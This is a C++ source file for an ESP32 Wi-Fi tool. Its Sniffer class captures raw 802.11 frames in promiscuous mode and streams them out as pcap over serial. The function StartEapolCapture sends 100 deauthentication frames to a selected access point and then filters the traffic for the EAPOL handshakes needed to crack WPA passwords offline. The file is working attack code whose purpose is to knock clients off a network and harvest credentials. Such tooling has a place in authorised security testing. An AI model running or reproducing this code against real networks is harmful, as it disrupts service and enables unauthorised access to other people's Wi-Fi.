#include "sniffer.h"

Sniffer sniff;

void Sniffer::StartCapture(){
	if(!capture_start){
		check_filters = 0;
		esp_wifi_set_promiscuous(true);
		esp_wifi_set_promiscuous_rx_cb(&SnifferCallback);
		esp_wifi_set_channel(sniffer_channel, WIFI_SECOND_CHAN_NONE);
		Serial.println("START");
		pcap.startSerial();
		capture_start = true;
	}
}

void Sniffer::StartEapolCapture()
{
	if (!capture_start)
	{
		for (size_t i = 0; i < scan.APs_count; i++)
		{
			if (scan.AP_list[i].selected == true)
			{
				for (size_t b = 0; b < 100; b++)
				{
					attack.deauthDevice(i);
					delay(10);
				}
				Serial.println(scan.AP_list[i].ssid);
				sniffer_channel = scan.AP_list[i].channel;
				break;
			}
		}
		check_filters = 1;
		esp_wifi_set_promiscuous(true);
		esp_wifi_set_promiscuous_rx_cb(&SnifferCallback);
		esp_wifi_set_channel(sniffer_channel, WIFI_SECOND_CHAN_NONE);
		Serial.println("START");
		pcap.startSerial();
		capture_start = true;
	}
}

void Sniffer::StopCapture()
{
	esp_wifi_set_promiscuous(false);
	capture_start = false;
};

void Sniffer::SnifferCallback(void *buf, wifi_promiscuous_pkt_type_t type)
{

	wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t *)buf;
	wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
	int len = snifferPacket->rx_ctrl.sig_len;

	if (len > 262144)
	{
		return;
	}

	if (sniff.check_filters)
	{
		for (uint8_t i = 0; i < sniff.filters_count; i++)
		{
			if (sniff.filters[i]->selected && memcmp(snifferPacket->payload + sniff.filters[i]->pos, sniff.filters[i]->value, sniff.filters[i]->size) == 0)
			{
				pcap.newPacketSerial(now(), (unsigned int)(micros() - millis() * 1000), len, snifferPacket->payload);
			}
		}
	}
	else
	{
		pcap.newPacketSerial(now(), (unsigned int)(micros() - millis() * 1000), len, snifferPacket->payload);
	}

	// if (
	//   // Beacon Frame (тип кадра 0x80)
	//   (memcmp(snifferPacket->payload+sniff.beacon.pos, sniff.beacon.value, sniff.beacon.size) ==0) ||
	//   // EAPOL (проверка на 0x888E)
	//   (memcmp(snifferPacket->payload+sniff.eapol.pos, sniff.eapol.value, sniff.eapol.size) == 0)){
	// 		pcap.newPacketSerial(now(), (unsigned int)(micros() - millis() * 1000), len, snifferPacket->payload);
	// }
}
